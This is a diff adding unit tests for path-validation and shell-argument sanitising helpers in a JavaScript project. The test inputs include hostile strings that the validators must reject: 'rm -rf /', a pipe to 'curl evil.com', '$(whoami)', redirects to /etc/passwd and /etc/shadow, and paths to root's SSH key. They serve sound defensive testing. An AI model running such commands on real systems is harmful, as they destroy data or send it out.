@@ -54,6 +54,24 @@ describe('validatePath', () => {
     assert.ok(result.safe);
   });
 
+  test('rejects empty baseDir', () => {
+    const result = validatePath('src/index.js', '');
+    assert.ok(!result.safe);
+    assert.strictEqual(result.error, 'Empty or invalid base directory');
+  });
+
+  test('rejects non-string baseDir', () => {
+    const result = validatePath('src/index.js', 123);
+    assert.ok(!result.safe);
+    assert.strictEqual(result.error, 'Empty or invalid base directory');
+  });
+
+  test('rejects null baseDir', () => {
+    const result = validatePath('src/index.js', null);
+    assert.ok(!result.safe);
+    assert.strictEqual(result.error, 'Empty or invalid base directory');
+  });
+
   test('rejects absolute paths outside base even when opted in', () => {
     const result = validatePath('/etc/passwd', base, { allowAbsolute: true });
     assert.ok(!result.safe);
@@ -104,6 +122,20 @@ describe('requireSafePath', () => {
     assert.throws(
       () => requireSafePath('../../etc/passwd', base, 'PRD file'),
       /PRD file validation failed/
+    );
+  });
+
+  test('uses default label when label is undefined', () => {
+    assert.throws(
+      () => requireSafePath('../../etc/passwd', base, undefined),
+      /Path validation failed/
+    );
+  });
+
+  test('uses default label when label is empty string', () => {
+    assert.throws(
+      () => requireSafePath('../../etc/passwd', base, ''),
+      /Path validation failed/
     );
   });
 });
@@ -256,6 +288,18 @@ describe('sanitizeForDisplay', () => {
     const input = 'Type `pass` or describe what\\\'s wrong.';
     assert.equal(sanitizeForDisplay(input), input);
   });
+
+  test('handles null input gracefully', () => {
+    assert.equal(sanitizeForDisplay(null), null);
+  });
+
+  test('handles undefined input gracefully', () => {
+    assert.equal(sanitizeForDisplay(undefined), undefined);
+  });
+
+  test('handles empty string input', () => {
+    assert.equal(sanitizeForDisplay(''), '');
+  });
 });
 
 // ─── Shell Safety ───────────────────────────────────────────────────────────
@@ -297,6 +341,122 @@ describe('validateShellArg', () => {
 
   test('allows dollar signs not in substitution context', () => {
     assert.equal(validateShellArg('price is $50', 'test'), 'price is $50');
+  });
+
+  // SEC-03: Shell metacharacter rejection
+  test('rejects semicolon (command chaining)', () => {
+    assert.throws(
+      () => validateShellArg('arg1; rm -rf /', 'msg'),
+      /shell operator/
+    );
+  });
+
+  test('rejects pipe operator', () => {
+    assert.throws(
+      () => validateShellArg('data | curl evil.com', 'msg'),
+      /shell operator/
+    );
+  });
+
+  test('rejects ampersand (background execution)', () => {
+    assert.throws(
+      () => validateShellArg('cmd &', 'msg'),
+      /shell operator/
+    );
+  });
+
+  test('rejects output redirect', () => {
+    assert.throws(
+      () => validateShellArg('data > /etc/passwd', 'msg'),
+      /shell operator/
+    );
+  });
+
+  test('rejects input redirect', () => {
+    assert.throws(
+      () => validateShellArg('cmd < /etc/shadow', 'msg'),
+      /shell operator/
+    );
+  });
+
+  test('rejects newline (command chaining via line break)', () => {
+    assert.throws(
+      () => validateShellArg('arg1\nrm -rf /', 'msg'),
+      /newline/
+    );
+  });
+
+  test('rejects carriage return', () => {
+    assert.throws(
+      () => validateShellArg('arg1\rmalicious', 'msg'),
+      /newline/
+    );
+  });
+
+  test('rejects tilde expansion (~user)', () => {
+    assert.throws(
+      () => validateShellArg('~root/.ssh/id_rsa', 'msg'),
+      /tilde expansion/
+    );
+  });
+
+  test('allows bare tilde (home directory shorthand)', () => {
+    // ~/ is common and safe in many contexts; only ~username is dangerous
+    assert.equal(validateShellArg('~/documents', 'test'), '~/documents');
+  });
+
+  test('allows tilde in middle of string', () => {
+    assert.equal(validateShellArg('file~backup', 'test'), 'file~backup');
+  });
+
+  test('rejects non-string truthy value (number)', () => {
+    assert.throws(
+      () => validateShellArg(42, 'count'),
+      /empty or invalid/
+    );
+  });
+
+  // Tests for label fallback (label omitted → defaults to 'Argument')
+  test('uses default label for empty value without label', () => {
+    assert.throws(
+      () => validateShellArg(''),
+      /Argument: empty or invalid/
+    );
+  });
+
+  test('uses default label for null bytes without label', () => {
+    assert.throws(
+      () => validateShellArg('file\0name'),
+      /Argument: contains null bytes/
+    );
+  });
+
+  test('uses default label for command substitution without label', () => {
+    assert.throws(
+      () => validateShellArg('$(whoami)'),
+      /Argument: contains potential command substitution/
+    );
+  });
+
+  test('uses default label for shell operator without label', () => {
+    assert.throws(
+      () => validateShellArg('foo;bar'),
+      /Argument: contains shell operator/
+    );
+  });
+
+  test('uses default label for newline without label', () => {
+    assert.throws(
+      () => validateShellArg('foo\nbar'),
+      /Argument: contains newline/
+    );
+  });
+
+  test('uses default label for tilde expansion without label', () => {
+    assert.throws(
+      () => validateShellArg('~root/.ssh'),
+      /Argument: contains tilde expansion/
+    );
   });
 });
 
@@ -412,5 +572,36 @@ describe('validateFieldName', () => {
   test('must start with a letter', () => {
     assert.ok(!validateFieldName('123field').valid);
     assert.ok(!validateFieldName('-field').valid);
+  });
+});
+
+// ─── SEC-02: Path containment sibling directory rejection ────────────────────
+
+describe('validatePath — SEC-02 sibling directory containment', () => {
+  test('rejects sibling directory with shared prefix', () => {
+    // /projects/my-app-evil should NOT be considered inside /projects/my-app
+    const base = '/projects/my-app';
+    const siblingPath = '../my-app-evil/secret.js';
+    const result = validatePath(siblingPath, base);
+    assert.ok(!result.safe, 'sibling directory with shared prefix should be rejected');
+  });
+
+  test('rejects sibling with longer shared prefix via absolute path', () => {
+    const base = '/projects/my-app';
+    const result = validatePath('/projects/my-app-evil/data.json', base, { allowAbsolute: true });
+    assert.ok(!result.safe, 'absolute path to sibling directory should be rejected');
+  });
+
+  test('allows paths that legitimately extend the base directory', () => {
+    const base = '/projects/my-app';
+    const result = validatePath('src/deep/nested/file.js', base);
+    assert.ok(result.safe, 'deeply nested paths within base should be allowed');
+  });
+
+  test('rejects exact base with traversal suffix', () => {
+    const base = '/projects/my-app';
+    // Try to escape by going up then into a sibling
+    const result = validatePath('../my-app-production/config.json', base);
+    assert.ok(!result.safe, 'traversal to sibling with similar name should be rejected');
   });
 });
